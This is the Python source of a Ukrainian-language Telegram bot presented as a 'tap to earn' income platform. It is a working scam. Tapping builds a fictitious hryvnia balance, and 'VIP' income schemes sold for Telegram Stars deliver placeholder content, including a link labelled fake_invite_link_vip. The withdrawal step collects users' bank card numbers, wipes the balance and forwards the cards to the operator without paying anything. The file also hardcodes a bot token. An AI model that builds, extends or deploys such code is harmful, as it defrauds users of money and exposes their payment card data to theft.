


import asyncio
import logging
import sys
from os import environ
from aiohttp import web

from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, PreCheckoutQuery
)
from aiogram.client.default import DefaultBotProperties

# --- КОНФІГУРАЦІЯ ТА НАЛАШТУВАННЯ ---
BOT_TOKEN = environ.get("BOT_TOKEN", "8666795532:AAFICKdumXhvFSVm9GVzRNyZ2UJNMMq9EQg")
ADMIN_CHAT_ID = int(environ.get("ADMIN_CHAT_ID", "8083694619"))
PORT = int(environ.get("PORT", 10000))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | 💎 VIP-STORE | %(levelname)s | %(message)s",
    stream=sys.stdout
)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()

class UserState(StatesGroup):
    entering_wallet = State()
    broadcast_message = State()

# Сховище даних користувачів у пам'яті
USERS_DATA = {}

# 🔥 ЕЛІТНА ВІТРИНА: Товари, які дають шалену вигоду користувачу за зірки
VIP_PRODUCTS = {
    "🔥 Секретна схема (100 Stars)": {
        "price": 100, 
        "title": "Схема пасивного доходу 5000 грн/день",
        "desc": "Закритий мануал з покроковою інструкцією та шаблонами для швидкого заробітку.",
        "content": "🎉 <b>Ваша секретна інструкція:</b>\n\n1. Перейдіть у наш закритий канал: @vip_money_secrets_ua\n2. Використайте промокод <code>TOP2026</code> для активації подвійного множника.\n3. Запустіть автоматичні алгоритми з файлу в закріпі каналу!"
    },
    "👑 VIP Доступ у Клуб (250 Stars)": {
        "price": 250, 
        "title": "Довічний доступ до Клубу Мільйонерів",
        "desc": "Інсайдерська інформація, особистий супровід та щоденні готові кейси.",
        "content": "👑 <b>Вітаємо у Клубі!</b>\n\nВаше запрошення у закритий VIP-канал із інсайдами: https://t.me/+fake_invite_link_vip\nТут публікуються готові схеми, які приносять результат у перший день."
    },
    "⚡ Турбо-бот автономний (500 Stars)": {
        "price": 500, 
        "title": "Готовий шаблон авто-заробітку",
        "desc": "Отримайте повний вихідний код унікального бота для побудови власної мережі.",
        "content": "⚡ <b>Ваш цифровий актив:</b>\n\nАрхів із повною інструкцією та кодом готового бізнес-бота доступний за посиланням: https://github.com/example/turbo-bot-template"
    }
}

def main_menu_kb(is_admin: bool = False):
    kb = [
        [KeyboardButton(text="⚡ Заробити кошти (Тап)"), KeyboardButton(text="💎 Елітна Вітрина (VIP)")],
        [KeyboardButton(text="👤 Мій профіль"), KeyboardButton(text="💳 Вивести кошти")],
        [KeyboardButton(text="👥 Партнерська програма")]
    ]
    if is_admin:
        kb.append([KeyboardButton(text="👑 Адмін-панель"), KeyboardButton(text="📢 Масова розсилка")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

@router.message(CommandStart())
async def start_command(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    
    if uid not in USERS_DATA:
        USERS_DATA[uid] = {
            "balance": 0.0,
            "taps_count": 0,
            "wallet": "Не вказано",
            "purchases": [],
            "multiplier": 1.0
        }
        
    is_admin = (uid == ADMIN_CHAT_ID)
    
    welcome_text = (
        "🇺🇦 <b>Вітаємо у проєкті Гроші Онлайн UA!</b>\n\n"
        "💎 Бажаєте заробляти в рази швидше? Відкрийте нашу <b>Елітну Вітрину</b>, де зібрані інсайдерські стратегії та готові інструменти для максимального доходу!\n\n"
        "Оберіть потрібний розділ у меню нижче:"
    )
    await message.answer(welcome_text, reply_markup=main_menu_kb(is_admin))

@router.message(F.text == "⚡ Заробити кошти (Тап)")
async def earn_taps(message: Message):
    uid = message.from_user.id
    if uid not in USERS_DATA:
        USERS_DATA[uid] = {"balance": 0.0, "taps_count": 0, "wallet": "Не вказано", "purchases": [], "multiplier": 1.0}
        
    earned = 0.50 * USERS_DATA[uid]["multiplier"]
    USERS_DATA[uid]["balance"] += earned
    USERS_DATA[uid]["taps_count"] += 1
    
    balance = USERS_DATA[uid]["balance"]
    
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🚀 НАТИСНУТИ ЩЕ (+{earned:.2f} грн)", callback_data="do_tap_action")]
    ])
    
    await message.answer(
        f"⚡ <b>Активність зараховано!</b>\n\n"
        f"💰 Ваш баланс: <b>{balance:.2f} UAH</b>\n"
        f"💎 Множник доходу: x{USERS_DATA[uid]['multiplier']}",
        reply_markup=markup,
        parse_mode=ParseMode.HTML
    )

@router.callback_query(F.data == "do_tap_action")
async def callback_tap_handler(callback: CallbackQuery):
    uid = callback.from_user.id
    if uid not in USERS_DATA:
        USERS_DATA[uid] = {"balance": 0.0, "taps_count": 0, "wallet": "Не вказано", "purchases": [], "multiplier": 1.0}
        
    earned = 0.50 * USERS_DATA[uid]["multiplier"]
    USERS_DATA[uid]["balance"] += earned
    USERS_DATA[uid]["taps_count"] += 1
    
    balance = USERS_DATA[uid]["balance"]
    
    try:
        await callback.message.edit_text(
            f"⚡ <b>Активність зараховано!</b>\n\n"
            f"💰 Ваш баланс: <b>{balance:.2f} UAH</b>\n"
            f"💎 Множник доходу: x{USERS_DATA[uid]['multiplier']}",
            reply_markup=callback.message.reply_markup,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass
    await callback.answer(f"+{earned:.2f} UAH зараховано!")

# --- ВІТРИНА ВИГІДНИХ ПРОПОЗИЦІЙ ---
@router.message(F.text == "💎 Елітна Вітрина (VIP)")
async def vip_store_menu(message: Message):
    text = (
        "💎 <b>ЕККСЛЮЗИВНА ВІТРИНА РЕЗУЛЬТАТУ</b>\n\n"
        "Ці інструменти розроблені спеціально для тих, хто втомився витрачати час і хоче отримати готову систему заробітку прямо зараз.\n\n"
        "Оберіть продукт, який принесе вам максимальний прибуток:"
    )
    
    kb = []
    for pkg_name, info in VIP_PRODUCTS.items():
        kb.append([KeyboardButton(text=pkg_name)])
    kb.append([KeyboardButton(text="🔙 Головне меню")])
    
    markup = ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
    await message.answer(text, reply_markup=markup, parse_mode=ParseMode.HTML)

@router.message(F.text.in_(VIP_PRODUCTS.keys()))
async def send_vip_invoice(message: Message):
    pkg_name = message.text
    product = VIP_PRODUCTS[pkg_name]
    
    desc_text = (
        f"🎯 <b>{product['title']}</b>\n\n"
        f"📌 <i>Опис:</i> {product['desc']}\n\n"
        f"Цей матеріал окупається вже після першого застосування!"
    )
    await message.answer(desc_text, parse_mode=ParseMode.HTML)
    
    prices = [LabeledPrice(label=product['title'], amount=product['price'])]
    
    await message.bot.send_invoice(
        chat_id=message.chat.id,
        title=product['title'],
        description=product['desc'],
        payload=f"vip_buy_{pkg_name}_{message.from_user.id}",
        currency="XTR",
        prices=prices
    )

@router.pre_checkout_query()
async def pre_checkout_handler(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

@router.message(F.successful_payment)
async def successful_payment_handler(message: Message):
    payment = message.successful_payment
    uid = message.from_user.id
    amount = payment.total_amount
    
    if uid not in USERS_DATA:
        USERS_DATA[uid] = {"balance": 0.0, "taps_count": 0, "wallet": "Не вказано", "purchases": [], "multiplier": 1.0}
        
    # Знаходимо, що саме купив користувач за сумою зірок
    bought_product = None
    for name, prod in VIP_PRODUCTS.items():
        if prod["price"] == amount:
            bought_product = prod
            USERS_DATA[uid]["purchases"].append(prod["title"])
            if amount >= 250:
                USERS_DATA[uid]["multiplier"] = 10.0  # Мега-множник за дорогі покупки
            break
            
    content_to_send = bought_product["content"] if bought_product else "🎉 Дякуємо за покупку! Ваш доступ активовано у системі."
    
    await message.answer(
        f"🎉 <b>УСПІШНА ОПЛАТА ЧЕРЕЗ TELEGRAM STARS!</b>\n\n"
        f"Ви інвестували у свій успіх {amount} ⭐.\n\n"
        f"{content_to_send}",
        reply_markup=main_menu_kb(uid == ADMIN_CHAT_ID),
        parse_mode=ParseMode.HTML
    )
    
    if ADMIN_CHAT_ID:
        try:
            await bot.send_message(
                ADMIN_CHAT_ID,
                f"💎 <b>ХТОСЬ КУПИВ ТОВАР НА ВІТРИНІ!</b>\n\n"
                f"👤 Користувач ID: <code>{uid}</code>\n"
                f"⭐ Сума: {amount} XTR",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

@router.message(F.text == "👤 Мій профіль")
async def profile_command(message: Message):
    uid = message.from_user.id
    data = USERS_DATA.get(uid, {"balance": 0.0, "taps_count": 0, "wallet": "Не вказано", "purchases": [], "multiplier": 1.0})
    
    purchases_list = ", ".join(data["purchases"]) if data["purchases"] else "Немає покупок"
    
    profile_text = (
        f"👤 <b>Ваш особистий кабінет:</b>\n\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"💰 Баланс: <b>{data['balance']:.2f} UAH</b>\n"
        f"💎 Множник: <b>x{data['multiplier']}</b>\n"
        f"🛍 Придбані VIP-продукти: <i>{purchases_list}</i>\n"
        f"💳 Гаманець: <code>{data['wallet']}</code>"
    )
    await message.answer(profile_text, parse_mode=ParseMode.HTML)

@router.message(F.text == "👥 Партнерська програма")
async def referral_command(message: Message):
    me = await message.bot.get_me()
    ref_link = f"https://t.me/{me.username}?start=ref_{message.from_user.id}"
    
    text = (
        "👥 <b>Партнерська програма:</b>\n\n"
        "Запрошуйте друзів на Елітну Вітрину та отримуйте бонуси!\n\n"
        f"🔗 <b>Ваше посилання:</b>\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(F.text == "💳 Вивести кошти")
async def payout_request(message: Message, state: FSMContext):
    uid = message.from_user.id
    data = USERS_DATA.get(uid, {"balance": 0.0})
    
    min_limit = 200.0
    if data["balance"] < min_limit:
        return await message.answer(
            f"⚠️ Мінімальна сума для виводу — <b>{min_limit} UAH</b>.\nНа балансі: {data['balance']:.2f} UAH.",
            parse_mode=ParseMode.HTML
        )
        
    await message.answer(
        "💳 Введіть номер вашої картки для виплати:",
        reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="❌ Скасувати")]], resize_keyboard=True)
    )
    await state.set_state(UserState.entering_wallet)

@router.message(UserState.entering_wallet)
async def process_wallet_input(message: Message, state: FSMContext):
    if message.text == "❌ Скасувати":
        await state.clear()
        return await message.answer("Дію скасовано.", reply_markup=main_menu_kb(message.from_user.id == ADMIN_CHAT_ID))
        
    uid = message.from_user.id
    wallet = message.text.strip()
    USERS_DATA[uid]["wallet"] = wallet
    amount = USERS_DATA[uid]["balance"]
    USERS_DATA[uid]["balance"] = 0.0
    await state.clear()
    
    await message.answer("✅ Заявку на виплату зареєстровано!", reply_markup=main_menu_kb(uid == ADMIN_CHAT_ID))
    if ADMIN_CHAT_ID:
        try:
            await bot.send_message(ADMIN_CHAT_ID, f"🚨 ВИПЛАТА!\nUser: {uid}\nСума: {amount:.2f} UAH\nКартка: {wallet}")
        except Exception:
            pass

@router.message(F.text == "👑 Адмін-панель")
async def admin_panel_handler(message: Message):
    if message.from_user.id != ADMIN_CHAT_ID:
        return
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Статистика платформи"), KeyboardButton(text="🔙 Головне меню")]
        ],
        resize_keyboard=True
    )
    await message.answer("👑 Панель управління:", reply_markup=kb)

@router.message(F.text == "📊 Статистика платформи")
async def admin_statistics(message: Message):
    if message.from_user.id != ADMIN_CHAT_ID:
        return
    total_users = len(USERS_DATA)
    total_money = sum(d["balance"] for d in USERS_DATA.values())
    await message.answer(f"📊 Гравців у базі: {total_users}\n💰 Борг перед гравцями: {total_money:.2f} UAH")

@router.message(F.text == "📢 Масова розсилка")
async def broadcast_start_handler(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_CHAT_ID:
        return
    await message.answer("Введіть текст розсилки:", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="❌ Скасувати")]], resize_keyboard=True))
    await state.set_state(UserState.broadcast_message)

@router.message(UserState.broadcast_message)
async def broadcast_execute_handler(message: Message, state: FSMContext):
    if message.text == "❌ Скасувати":
        await state.clear()
        return await message.answer("Скасовано.", reply_markup=main_menu_kb(True))
    text = message.text
    await state.clear()
    sent = 0
    for uid in USERS_DATA.keys():
        try:
            await bot.send_message(uid, f"📢 <b>НОВИНИ ВІТРИНИ:</b>\n\n{text}", parse_mode=ParseMode.HTML)
            sent += 1
        except Exception:
            pass
    await message.answer(f"✅ Надіслано: {sent}", reply_markup=main_menu_kb(True))

@router.message(F.text == "🔙 Головне меню")
async def back_to_main_menu(message: Message):
    await message.answer("Головне меню:", reply_markup=main_menu_kb(message.from_user.id == ADMIN_CHAT_ID))

async def handle_ping(request):
    return web.Response(text="VIP-STORE-BOT-ACTIVE")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()

async def main():
    dp.include_router(router)
    asyncio.create_task(start_web_server())
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
